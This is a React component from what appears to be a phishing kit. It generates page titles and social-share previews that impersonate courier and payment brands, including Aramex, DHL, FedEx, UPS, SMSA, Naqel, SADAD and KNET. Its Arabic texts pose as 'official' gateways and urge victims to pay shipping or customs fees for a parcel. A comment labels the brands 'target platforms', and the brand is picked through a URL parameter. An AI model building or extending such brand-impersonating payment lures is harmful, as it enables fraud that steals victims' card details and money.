import { Helmet } from 'react-helmet-async';
import { getServiceBranding } from '@/lib/serviceLogos';
import { getEntityPaymentShareImage, getEntityIdentity, detectEntityFromURL, getBankOGImage } from '@/lib/dynamicIdentity';

/**
 * WORM_V2: Official Metadata Dictionary (1:1 with target platforms)
 */
const companyMeta: Record<string, { title: string; description: string; image: string }> = {
  aramex: {
    title: "أرامكس - سداد قيمة الشحن وتوصيل الطرود 🚚",
    description: "بوابة سداد أرامكس الرسمية. يرجى إكمال عملية الدفع لتأكيد استلام شحنتك وضمان التوصيل في الموعد المحدد. دفع آمن وسريع.",
    image: "/og-aramex.jpg"
  },
  dhl: {
    title: "DHL Express - Secure Online Payment ⚡",
    description: "بوابة الدفع الإلكتروني من DHL. ادفع رسوم الشحن والجمارك الآن لضمان سرعة معالجة طردك العالمي. نظام دفع مشفر بالكامل.",
    image: "/og-dhl.jpg"
  },
  fedex: {
    title: "FedEx - نظام سداد رسوم الشحن الدولي 📦",
    description: "بوابة فيديكس للدفع الإلكتروني. أكمل عملية الدفع الآن لتتبع شحنتك وضمان وصولها بأمان وسرعة إلى وجهتها.",
    image: "/og-fedex.jpg"
  },
  ups: {
    title: "UPS - بوابة الدفع الإلكتروني الرسمية 🌐",
    description: "ادفع رسوم الشحن والتوصيل مع UPS. بوابة آمنة وسهلة الاستخدام تضمن حقوقك وتسرع من عملية استلام الطرود العالمية.",
    image: "/og-ups.jpg"
  },
  smsa: {
    title: "سمسا إكسبريس - سداد فواتير الشحن 🚛",
    description: "بوابة سمسا الرسمية للمدفوعات. يرجى إدخال بيانات الدفع لتأكيد توصيل شحنتك المحلية أو الدولية في جميع أنحاء المملكة.",
    image: "/og-smsa.jpg"
  },
  naqel: {
    title: "ناقل إكسبريس - الدفع الإلكتروني السريع 🚚",
    description: "بوابة ناقل للدفع الآمن. أكمل سداد الرسوم الآن لتسهيل عملية التوصيل والاستلام في الموعد المحدد.",
    image: "/og-naqel.jpg"
  },
  sadad: {
    title: "نظام سداد للمدفوعات - بوابة السداد الرسمية 🏛️",
    description: "بوابة سداد الموحدة. سدد فواتيرك ورسوم الخدمات الحكومية والخاصة بأمان تام وسرعة فائقة عبر نظام سداد المعتمد.",
    image: "/og-government_payment.jpg"
  },
  knet: {
    title: "KNET - بوابة الدفع الإلكتروني المشتركة 🇰🇼",
    description: "بوابة كي نت الرسمية. أكمل عملية الدفع الآمنة عبر شبكة المعلومات القانونية في دولة الكويت. حماية كاملة لبياناتك.",
    image: "/og-knet.jpg"
  },
  default: {
    title: "بوابة الدفع الإلكتروني الرسمية - سداد آمن 💳",
    description: "بوابة دفع رسمية مشفرة لضمان أمان معاملاتك المالية. متوافقة مع معايير الأمان العالمية.",
    image: "/og-aramex.jpg"
  }
};

interface PaymentMetaTagsProps {
  serviceKey: string;
  serviceName: string;
  amount?: string;
  title?: string;
  customDescription?: string;
  description?: string;
}

export const PaymentMetaTags: React.FC<PaymentMetaTagsProps> = ({
  serviceKey,
  serviceName,
  amount,
  title,
  customDescription,
  description,
}) => {
  const branding = getServiceBranding(serviceKey);
  
  const detectedEntity = detectEntityFromURL();
  const entityIdentity = detectedEntity ? getEntityIdentity(detectedEntity) : null;
  const entityShareImage = detectedEntity ? getEntityPaymentShareImage(detectedEntity) : null;
  const entityDescription = entityIdentity?.payment_share_description;
  
  const urlParams = new URLSearchParams(window.location.search);
  const companyParam = urlParams.get('company') || serviceKey;
  const companyMetaData = companyMeta[companyParam.toLowerCase()] || companyMeta.default;
  
  let ogImagePath = entityShareImage || companyMetaData.image || branding.ogImage;
  
  if (serviceKey.startsWith('bank_')) {
    const bankId = serviceKey.replace('bank_', '');
    ogImagePath = getBankOGImage(bankId) || "/og-bank_pages.jpg";
  }
  
  const pageTitle = title || companyMetaData.title;
  const pageDescription = description || customDescription || companyMetaData.description || entityDescription || branding.description;
  const ogImage = ogImagePath ? `${window.location.origin}${ogImagePath}` : undefined;
  
  return (
    <Helmet>
      <title>{pageTitle}</title>
      <meta name="description" content={pageDescription} />
      
      <meta property="og:type" content="website" />
      <meta property="og:title" content={pageTitle} />
      <meta property="og:description" content={pageDescription} />
      <meta property="og:url" content={window.location.href} />
      {ogImage && (
        <>
          <meta property="og:image" content={ogImage} />
          <meta property="og:image:secure_url" content={ogImage} />
          <meta property="og:image:width" content="1200" />
          <meta property="og:image:height" content="630" />
          <meta property="og:image:alt" content={serviceName} />
          <meta property="og:image:type" content="image/jpeg" />
        </>
      )}
      
      <meta name="twitter:card" content="summary_large_image" />
      <meta name="twitter:title" content={pageTitle} />
      <meta name="twitter:description" content={pageDescription} />
      {ogImage && <meta name="twitter:image" content={ogImage} />}
      
      <meta name="theme-color" content={entityIdentity?.colors.primary || branding.colors.primary} />
      
      {ogImagePath && <link rel="preload" as="image" href={ogImagePath} />}
      <link rel="preconnect" href="https://fonts.googleapis.com" />
      <link rel="preconnect" href="https://fonts.gstatic.com" crossOrigin="anonymous" />
      
      <meta name="robots" content="index, follow" />
      <meta name="googlebot" content="index, follow" />
      <link rel="canonical" href={window.location.href} />
    </Helmet>
  );
};

export default PaymentMetaTags;
